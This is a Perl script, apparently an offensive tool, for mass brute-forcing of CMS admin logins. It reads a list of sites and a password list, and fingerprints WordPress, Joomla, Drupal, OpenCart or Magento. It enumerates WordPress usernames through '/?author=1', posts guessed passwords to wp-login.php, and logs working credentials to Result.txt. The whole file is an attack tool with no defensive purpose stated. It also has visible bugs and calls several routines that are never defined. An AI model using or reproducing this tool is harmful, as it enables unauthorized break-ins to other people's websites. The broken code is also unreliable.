#!/usr/bin/perl

use if $^O eq "MSWin32", Win32::Console::ANSI;
use Term::ANSIColor;
use URI::URL;
use Getopt::Long;
use LWP::UserAgent;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);

if ($^0 =~ /MSWin32/) {system("cls"); }else { system("clear"); }

GetOptions(
    "l|list=s" => \$list,
    "p|passwords=s" => \$pass,
);

banner();

unless ($list|$pass) { help(); }
if ($list|$pass) { webbrute(); }

sub banner() {
    print color('bold red'), "WEB BRUTE FORCER";
    print color('bold white'), "FOR WordPress , Joomla , DruPal , OpenCart , Magento";
    print color('reset');
};

sub help() {
print q(
    Usage: perl bruteforcer.pl -l list.txt -p passwords.txt

    options:
    -l => websits list
    -p => passwords list
);
}

sub bruteforcer{
print color('bold red')," [";
print color('bold green'),"1";
print color('bold red'),"]";
print color('bold white')," WordPress \n";
print color('bold red')," [";
print color('bold green');
print color('bold green'),"2";
print color('bold red'),"]";
print color('bold white')," Joomla \n";
print color('bold red')," [";
print color('bold green'),"3";
print color('bold red'),"]";
print color('bold white')," DruPal \n";
print color('bold red')," [";
print color('bold green'),"4";
print color('bold red'),"]";
print color('bold white')," OpenCart \n";
print color('bold red')," [";
print color('bold green'),"5";
print color('bold red'),"]";
print color('bold white')," Magento \n";
print color('bold red')," [";
print color('bold green'),"6";
print color('bold red'),"]";
print color('bold white')," Auto \n";
print color('bold red')," [";
print color('bold green'),"+";
print color('bold red'),"]";
print color('bold white')," Choose Number : ";

my $Number = <STDIN>;
chomp $number;
print "\n"
if($number eq '1')
{
    open(THETARGET, "<$list") || die "cant open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
    chomp($site);
    print color('bold red'), "\n [";
    print color('bold green'), "+";
    print color('bold red'), "] "
    print color('bold red'),"$site",
    wpuser();
}
}
if($number eq '2')
{
open (THETARGET, "<$list") || die "cant open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){

chomp($site);

print color('bold red'), "\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'), "$site";
joomla();
}
}

if($number eq '3')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
drupal();
}
}

if($number eq '4')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
opencart();
}
}

if($number eq '5')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
magento();
}
}
if($number eq '6')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
cms();
}
}
}

################ CMS DETCTER #####################
sub cms(){
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $cms = $ua->get("$site")->content;
if($cms =~/wp-content|wordpress/) {
print color('bold white')," - ";
print color("bold green"), "WordPress";
wpuser();
}

elsif($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white')," - ";
print color("bold green"), "Joomla";
joomla();
}
elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
print color('bold white')," - ";
print color("bold green"), "Drupal";
drupal();
}

elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
print color('bold white')," - ";
print color("bold green"), "OpenCart";
opencart();
}

elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
   print color("bold green"), " - Magento";
magento();
}
else{
print color('bold white')," - ";
print color("bold red"), "Unknown";
}
}

###### GET WP USER #######
sub wpuser{
print color('reset');
$user = $site . '/?author=1';

$getuser = $ua->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Username: $wpuser\n";
wp();
}
else {
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Can't Get Username\n";
}
}


###### WorDPress #######
sub wp{
print color('bold red'),"\n [";
print color('bold green'),"-";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$wp = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $_;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $wpass ";
$wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print color('bold white'),"- ";
print color('bold green'),"FOUND\n";
print color('reset');

open (TEXT, '>>Result.txt');
print TEXT "$wp ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
next OUTER;
}
}
}
}
